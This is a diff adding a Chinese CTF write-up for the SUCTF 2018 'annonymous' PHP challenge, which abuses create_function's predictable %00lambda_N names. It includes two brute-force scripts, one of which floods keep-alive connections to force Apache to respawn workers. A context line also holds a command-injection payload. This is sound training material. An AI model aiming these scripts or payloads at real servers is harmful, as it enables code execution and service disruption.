@@ -7176,3 +7176,77 @@ file "";head /fla*;"" ;
     因为后台会验证后缀名，所以也要加一下。
 
     bp抓取上传文件的数据包，修改文件名为payload2，访问show.php就能拿到flag。
+
+## SUCTF 2018 annonymous(php匿名函数\x00lambda_)
+
+1. 源码
+
+    ```php
+     <?php
+    $MY = create_function("","die(`cat flag.php`);");
+    $hash = bin2hex(openssl_random_pseudo_bytes(32));
+    eval("function SUCTF_$hash(){"
+        ."global \$MY;"
+        ."\$MY();"
+        ."}");
+    if(isset($_GET['func_name'])){
+        $_GET["func_name"]();
+        die();
+    }
+    show_source(__FILE__); 
+    ```
+
+2. 解题
+
+    一开始思路偏了，去网上找`openssl_random_pseudo_bytes(32)`函数漏洞，看到有说这个函数生成的随机数可以被暴力猜解，但是找了很久没发现。
+
+    去看了wp才知道本题的漏洞在`create_function`函数上。
+
+    create_function()函数在创建之后会生成一个函数名为：`%00lambda_num`
+
+    num是持续递增的，这里的num会一直递增到最大长度直到结束,通过大量的请求来迫使Pre-fork模式启动Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了
+
+    爆破脚本(没有成功，没跑出来)
+
+    ```python
+    import requests
+    while True:
+        r=requests.get('http://5447d59a-c7c3-4466-8ed7-758815e319f5.node5.buuoj.cn:81/?func_name=%00lambda_1')
+        if 'flag' in r.text:
+            print(r.text)
+            break
+        print('Testing.......')
+    ```
+    官方脚本(python2，也没成功。。。)
+    ```python
+    # coding: UTF-8
+    # Author: orange@chroot.org
+    # using python2
+
+    import requests
+    import socket
+    import time
+    from multiprocessing.dummy import Pool as ThreadPool
+    try:
+        requests.packages.urllib3.disable_warnings()
+    except:
+        pass
+
+    def run(i):
+        while 1:
+            HOST = '28ae7c60-92ae-447c-a9c9-b50024d45b25.node3.buuoj.cn'
+            PORT = 80
+            se = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            se.connect((HOST, PORT))
+            se.send("GET / HTTP/1.1\r\n")
+            se.send("Host: 28ae7c60-92ae-447c-a9c9-b50024d45b25.node3.buuoj.cn\r\n")
+            se.send("Connection: keep-alive\r\n\r\n")
+            # s.close()
+            print 'ok'
+            time.sleep(0.5)
+
+    i = 8
+    pool = ThreadPool( i )
+    result = pool.map_async( run, range(i) ).get(0xffff)
+    ```
+    也可以用bp的intruder模块爆破，不过不知道为什么，这道题我爆破了好几次，最后一次才把flag跑出来。可能环境有问题。
